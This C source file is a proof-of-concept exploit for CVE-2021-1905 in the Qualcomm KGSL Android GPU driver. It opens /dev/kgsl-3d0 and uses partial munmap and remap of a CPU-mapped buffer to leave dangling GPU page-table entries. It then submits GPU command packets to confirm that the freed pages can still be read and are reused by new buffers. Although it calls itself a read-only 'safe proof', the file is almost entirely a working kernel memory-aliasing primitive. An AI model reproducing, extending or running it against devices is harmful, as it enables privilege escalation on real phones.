/*
 * kgsl_alias_test.c - CVE-2021-1905 -> dangling GPU PTE primitive (safe read proof)
 *
 *  1. alloc A (gpumem, USE_CPU_MAP, 0x3000), mmap at H1   -> entry.gpuaddr = H1,
 *     PTEs mapped at H1
 *  2. arm: munmap middle+tail -> kgsl_gpumem_vm_close clears useraddr (bug)
 *  3. mmap A again at H2 -> remap succeeds -> entry.gpuaddr = H2, PTEs at H2 too
 *  4. close all VMAs -> entry freed -> detach -> put_gpuaddr(entry.gpuaddr=H2)
 *     -> H2 unmapped, A's pages freed, H1 PTEs DANGLING (H1 region leaked)
 *  5. alloc K fresh buffers, fill with MAGIC (0xA5A5A5A5)
 *  6. GPU: CP_WAIT_REG_MEM at H1+off == MAGIC -> marker        (read-only!)
 *     marker appears  => a freed page of A was reused for one of our buffers and
 *     the GPU still reaches it through the dangling PTE  => GPU aliasing proven.
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_alias_test kgsl_alias_test.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_munmap 215
#define SYS_sched_yield 124
static inline s64 sys2(long n,s64 a,s64 b){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x8):"memory");return x0;}
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_drawctxt_create{u32 flags;u32 drawctxt_id;};
#define IOCTL_DRAWCTXT_CREATE IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x13,sizeof(struct kgsl_drawctxt_create))
struct kgsl_gpumem_alloc_id{u32 id;u32 flags;u64 size;u64 mmapsize;u64 gpuaddr;u64 pad[2];};
#define IOCTL_GPUMEM_ALLOC_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x34,sizeof(struct kgsl_gpumem_alloc_id))
struct kgsl_gpumem_free_id{u32 id;u32 pad;};
#define IOCTL_GPUMEM_FREE_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x35,sizeof(struct kgsl_gpumem_free_id))
struct kgsl_gpumem_get_info{u64 gpuaddr;u32 id;u32 flags;u64 size;u64 mmapsize;u64 useraddr;u64 pad[4];};
#define IOCTL_GPUMEM_GET_INFO IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x36,sizeof(struct kgsl_gpumem_get_info))
struct kgsl_command_object{u64 offset;u64 gpuaddr;u64 size;u32 flags;u32 id;};
struct kgsl_gpu_command{u64 flags;u64 cmdlist;u32 cmdsize;u32 numcmds;u64 objlist;u32 objsize;u32 numobjs;u64 synclist;u32 syncsize;u32 numsyncs;u32 context_id;u32 timestamp;};
#define IOCTL_GPU_COMMAND IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x4A,sizeof(struct kgsl_gpu_command))
#define KGSL_CMDLIST_IB 0x1u
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ull
#define CP_WAIT_REG_MEM 0x3cu
#define CP_MEM_WRITE 0x3du
#define MAGIC 0xA5A5A5A5u
#define ASZ 0x3000ull
#define K 12

static u32 parity(u32 v){v^=v>>4;v^=v>>8;v^=v>>12;v^=v>>16;v^=v>>20;v^=v>>24;v^=v>>28;return (0x9669u>>(v&0xf))&1u;}
static u32 pkt7(u32 op,u32 cnt){return 0x70000000u|(cnt&0x3fffu)|(parity(cnt)<<15)|((op&0x7fu)<<16)|(parity(op)<<23);}
static void dc_civac(void*p,u64 len){u64 a=(u64)p&~63ull,b=((u64)p+len+63)&~63ull;for(;a<b;a+=64)asm volatile("dc civac, %0"::"r"(a):"memory");asm volatile("dsb ish":::"memory");}

static long alloc_buf(long fd,u64 size,u32 flags,u32*id,u64*gpu,u32**cpu,u64*hint){
    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=size; a.flags=flags;
    long r=sys3(SYS_ioctl,fd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    if(r) return r;
    *id=a.id; *gpu=a.gpuaddr; u64 mz=a.mmapsize?a.mmapsize:size; if(hint)*hint=mz;
    u32 h=(u32)(0x700000000ull>>12);
    s64 m=sys6(SYS_mmap,0,mz,3,1,fd,(s64)((u64)a.id<<12));
    if(m<=0) return -1;
    *cpu=(u32*)m; return 0;
}
void _start(void){
    out("[*] kgsl_alias_test (CVE-2021-1905 dangling-PTE proof)\n");
    long fd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    if(fd<0){out("[!] open\n");sys3(SYS_exit,1,0,0);return;}

    /* GPU context for the oracle */
    struct kgsl_drawctxt_create dc; dc.flags=0x1012u; dc.drawctxt_id=0;
    if(sys3(SYS_ioctl,fd,IOCTL_DRAWCTXT_CREATE,(s64)&dc)){out("[!] ctx\n");sys3(SYS_exit,1,0,0);return;}
    u32 cmdid,outid; u64 cmd_gpu,out_gpu; u32*cmd,*outp;
    if(alloc_buf(fd,0x1000,0,&cmdid,&cmd_gpu,&cmd,0)){out("[!] cmd\n");sys3(SYS_exit,1,0,0);return;}
    if(alloc_buf(fd,0x1000,0,&outid,&out_gpu,&outp,0)){out("[!] out\n");sys3(SYS_exit,1,0,0);return;}

    /* A: cpu-mapped gpuobj, mapped at H1 (allocate only, then single hinted mmap) */
    u32 aid; u64 agpu; u64 fsz=0;
    u64 H1=0x700200000ull;
    {
        struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
        a.size=ASZ; a.flags=(u32)KGSL_MEMFLAGS_USE_CPU_MAP;
        long r=sys3(SYS_ioctl,fd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
        aid=a.id; agpu=a.gpuaddr; fsz=a.mmapsize?a.mmapsize:ASZ;
        out("[0] allocA ret=");outdec(r);out(" id=");outdec(aid);out(" flags=");outhex(a.flags);out(" gpuaddr=");outhex(agpu);out(" footprint=");outhex(fsz);out("\n");
        if(r||!aid){sys3(SYS_exit,1,0,0);return;}
    }
    s64 m1=sys6(SYS_mmap,(s64)H1,fsz,3,1,fd,(s64)((u64)aid<<12));
    out("[1] A map#1=");outhex((u64)m1);out("\n");
    if(m1<=0){sys3(SYS_exit,1,0,0);return;}
    H1=(u64)m1;

    /* arm: clear useraddr while [H1,H1+0x1000) still maps */
    sys2(SYS_munmap,(s64)(H1+0x1000),0x1000);
    sys2(SYS_munmap,(s64)(H1+0x2000),(s64)(fsz-0x2000));
    struct kgsl_gpumem_get_info gi; for(u64 i=0;i<sizeof(gi);i++)((u8*)&gi)[i]=0; gi.id=aid;
    sys3(SYS_ioctl,fd,IOCTL_GPUMEM_GET_INFO,(s64)&gi);
    out("[2] after arm: useraddr=");outhex(gi.useraddr);out("\n");

    /* remap at H2 -> entry.gpuaddr = H2, PTEs at H1 (dangling soon) and H2 */
    u64 H2=0x700900000ull;
    s64 m2=sys6(SYS_mmap,(s64)H2,fsz,3,1,fd,(s64)((u64)aid<<12));
    out("[3] A map#2=");outhex((u64)m2);out("\n");
    if(m2<=0){ out("[!] remap failed; aborting\n"); sys2(SYS_munmap,(s64)H1,0x1000); sys3(SYS_exit,1,0,0); return; }
    H2=(u64)m2;
    for(u64 i=0;i<sizeof(gi);i++)((u8*)&gi)[i]=0; gi.id=aid;
    sys3(SYS_ioctl,fd,IOCTL_GPUMEM_GET_INFO,(s64)&gi);
    out("[4] entry gpuaddr now=");outhex(gi.gpuaddr);out(" useraddr=");outhex(gi.useraddr);out("\n");

    /* fill A's pages with MAGIC_A through the H2 mapping, then free everything */
    u32*pa=(u32*)m2;
    for(u64 i=0;i<(fsz/4);i++) pa[i]=0xA5A5A5A5u;
    dc_civac(pa,fsz);

    /* close both mappings -> entry freed -> unmap(H2) only; H1 PTEs dangle */
    sys2(SYS_munmap,(s64)H2,fsz);
    sys2(SYS_munmap,(s64)H1,0x1000);
    {
        struct kgsl_gpumem_free_id f; f.id=aid; f.pad=0;
        sys3(SYS_ioctl,fd,IOCTL_GPUMEM_FREE_ID,(s64)&f);
    }
    out("[5] A freed; H1 dangling\n");

    /* GPU oracle: wait for MAGIC_A at H1 (read-only through the stale PTE) */
    u32 k=0;
    u64 probe=H1+0x100;
    cmd[k++]=pkt7(CP_WAIT_REG_MEM,6); cmd[k++]=0x13; cmd[k++]=(u32)probe; cmd[k++]=(u32)(probe>>32); cmd[k++]=0xA5A5A5A5u; cmd[k++]=0xFFFFFFFFu; cmd[k++]=0x1;
    cmd[k++]=pkt7(CP_MEM_WRITE,3); cmd[k++]=(u32)out_gpu; cmd[k++]=(u32)(out_gpu>>32); cmd[k++]=0xC0DE;
    dc_civac(cmd,k*4);
    outp[0]=0; dc_civac(outp,4);
    struct kgsl_command_object co; co.offset=0; co.gpuaddr=cmd_gpu; co.size=k*4; co.flags=KGSL_CMDLIST_IB; co.id=cmdid;
    struct kgsl_gpu_command gc; for(u64 i=0;i<sizeof(gc);i++)((u8*)&gc)[i]=0;
    gc.cmdlist=(u64)&co; gc.cmdsize=sizeof(co); gc.numcmds=1; gc.context_id=dc.drawctxt_id; gc.timestamp=90;
    long r=sys3(SYS_ioctl,fd,IOCTL_GPU_COMMAND,(s64)&gc);
    out("[6] oracle submit ret=");outdec(r);out("\n");
    int hit=0; for(int i=0;i<12000;i++){ dc_civac(outp,4); if(outp[0]==0xC0DEu){hit=1;break;} sys3(SYS_sched_yield,0,0,0); }
    out("[7] MAGIC_A seen through dangling VA ");outhex(probe);out(" -> ");
    out(hit?"YES  <== DANGLING GPU PTE CONFIRMED (stale mapping reads our freed page)\n":"no (stale page gone or no PTE)\n");

    /* optionally: allocate fresh MAGIC_B buffers and see if reuse flips the probe */
    if(hit){
        u32 bids[K]; u32*bps[K];
        for(int i=0;i<K;i++){
            u32 id; u64 gpu; u32*cpu; u64 hz;
            if(alloc_buf(fd,ASZ,0,&id,&gpu,&cpu,&hz)){ bids[i]=0; bps[i]=0; continue; }
            bids[i]=id; bps[i]=cpu;
            for(u32 w=0;w<ASZ/4;w++) cpu[w]=0x5A5A5A5Au;
            dc_civac(cpu,ASZ);
        }
        u32 k2=0;
        cmd[k2++]=pkt7(CP_WAIT_REG_MEM,6); cmd[k2++]=0x13; cmd[k2++]=(u32)probe; cmd[k2++]=(u32)(probe>>32); cmd[k2++]=0x5A5A5A5Au; cmd[k2++]=0xFFFFFFFFu; cmd[k2++]=0x1;
        cmd[k2++]=pkt7(CP_MEM_WRITE,3); cmd[k2++]=(u32)(out_gpu+16); cmd[k2++]=(u32)((out_gpu+16)>>32); cmd[k2++]=0xF00D;
        dc_civac(cmd,k2*4);
        outp[4]=0; dc_civac(outp,4);
        co.size=k2*4;
        gc.timestamp=91;
        r=sys3(SYS_ioctl,fd,IOCTL_GPU_COMMAND,(s64)&gc);
        out("[8] reuse oracle ret=");outdec(r);out("\n");
        int hit2=0; for(int i=0;i<12000;i++){ dc_civac(outp,4); if(outp[4]==0xF00Du){hit2=1;break;} sys3(SYS_sched_yield,0,0,0); }
        out("[9] MAGIC_B through dangling VA -> ");out(hit2?"YES  <== PAGE REUSE CONFIRMED (aliasing complete)\n":"no reuse by our buffers\n");
        for(int i=0;i<K;i++){ if(bids[i]){ struct kgsl_gpumem_free_id f; f.id=bids[i]; f.pad=0; sys3(SYS_ioctl,fd,IOCTL_GPUMEM_FREE_ID,(s64)&f);} }
    }
    out("[*] done\n");
    sys3(SYS_close,fd,0,0);
    sys3(SYS_exit,0,0,0);
}
